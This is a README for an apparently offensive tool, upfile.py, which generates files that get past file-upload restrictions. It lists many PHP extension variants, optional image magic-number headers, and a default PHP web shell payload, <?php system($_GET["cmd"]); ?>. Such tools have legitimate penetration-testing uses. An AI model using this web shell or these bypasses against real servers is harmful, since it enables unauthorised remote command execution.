# generate-file-upload
Generate some payload to bypass restriction when you perform a file upload

```
python upfile.py
```
Generate in Payloads/ all extension for PHP

Default name : `payload`

Default file : `PHP`

Default payload : `<?php system($_GET["cmd"]); ?>`

-----

## Exemple of usage :
```
python upfile.py -b
```
Generate all bypass for PHP


```
python upfile.py -n test -p test -ext php
```
Generate file named `test.php` which contain `test`


```
python upfile.py -b -m png
```
Generate all files bypass for PHP, which contain `magicNumber + payload`


-----

## Options
```
usage: upfile.py [-h] [-d] [-p PAYLOAD] [-f {php}] [-ext EXTENSION] [-b] [-n NAME] [-m {png,jpg}]

Generate some payload to bypass restriction when you perform a file upload

options:
  -h, --help            show this help message and exit
  -d, --debug           Seen the debug to see the process
  -p PAYLOAD, --payload PAYLOAD
                        The payload in the files
  -f {php}, --file {php}
                        The type of the files
  -ext EXTENSION, --extension EXTENSION
                        Generate the payload with specific extension
  -b, --bypass          Bypass the restriction
  -n NAME, --name NAME  Name of the file
  -m {png,jpg}, --magic {png,jpg}
                        Magic Header
   ```                     
